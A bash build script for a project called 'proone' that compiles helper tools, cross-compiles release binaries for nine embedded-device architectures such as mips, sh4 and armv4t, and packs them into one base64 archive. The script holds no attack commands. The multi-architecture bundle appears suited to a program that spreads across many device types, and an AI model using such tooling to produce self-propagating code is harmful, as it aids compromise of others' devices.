#!/bin/bash
ARCH_ARR=(
	"aarch64"
	"armv4t"
	"armv7"
	"i686"
	"x86_64"
	"mips"
	"mpsl"
	"ppc"
	"sh4"
)
TOOLCHAIN_ARR=(
	"aarch64"
	"armv4t"
	"armv7"
	"i686"
	"x86_64"
	"mips"
	"mpsl"
	"ppc"
	"sh4"
)
HOST_ARR=(
	"aarch64-linux"
	"arm-linux"
	"arm-linux"
	"i686-linux"
	"x86_64-linux"
	"mips-linux"
	"mipsel-linux"
	"powerpc-linux"
	"sh4-linux"
)
ARR_SIZE="${#ARCH_ARR[@]}"
if [ $ARR_SIZE -ne "${#TOOLCHAIN_ARR[@]}" ] || [ $ARR_SIZE -ne "${#HOST_ARR[@]}" ]; then
	echo "Config error: arrays" >&2
	exit 2
fi

set -e

PROONE_PREFIX="builds"
PROONE_DEBUG_SYM="$PROONE_PREFIX/debug"
PROONE_REL_BIN="$PROONE_PREFIX/proone"
PROONE_TOOLS="$PROONE_PREFIX/tools"
PROONE_MISC_BIN="$PROONE_PREFIX/misc"
export PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM/proone.debug"
export PROONE_REL_BIN_PREFIX="$PROONE_REL_BIN/proone"
export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN/"
PROONE_PACKER="$PROONE_TOOLS/proone-pack"
PROONE_UNPACKER="$PROONE_TOOLS/proone-unpack"
PROONE_BIN_ARCHIVE="$PROONE_PREFIX/bin-archive"

rm -rf "$PROONE_PREFIX"
mkdir "$PROONE_PREFIX" "$PROONE_DEBUG_SYM" "$PROONE_REL_BIN" "$PROONE_TOOLS" "$PROONE_MISC_BIN"
set +e
make distclean
set -e

# native build for tools
./configure $PROONE_AM_CONF 
make -j$(nproc) 
cp -a src/proone-pack "$PROONE_PACKER" 
cp -a src/proone-unpack "$PROONE_UNPACKER" 
cp -a src/proone-list-arch "$PROONE_TOOLS/proone-list-arch" 
cp -a src/proone-mask "$PROONE_TOOLS/proone-mask" 
cp -a src/proone-print-all-data "$PROONE_TOOLS/proone-print-all-data" 
cp -a src/proone-resolv "$PROONE_TOOLS/proone-resolv"
make distclean

# cross-compile targets
for (( i = 0; i < ARR_SIZE; i += 1 )); do
	PROONE_HOST="${HOST_ARR[$i]}" PROONE_BIN_ARCH="${ARCH_ARR[$i]}" xcomp linux-app "${TOOLCHAIN_ARR[$i]}" "scripts/xcomp.sh"
	if [ $? -ne 0 ]; then
		exit $?
	fi
done

# pack
"$PROONE_PACKER" "$PROONE_REL_BIN_PREFIX."* | base64 >> "$PROONE_BIN_ARCHIVE"
if [ $? -ne 0 ]; then
	exit $?
fi

# archive test


# size report
total_bin_size=$(cat "$PROONE_REL_BIN_PREFIX."* | wc -c)
bin_archive_size=$(wc -c "$PROONE_BIN_ARCHIVE" | awk '{print $1;}')
echo "print(\"archive/bin = $bin_archive_size / $total_bin_size (\" + str($bin_archive_size / $total_bin_size * 100) + \"%)\")" | python3

exit 0
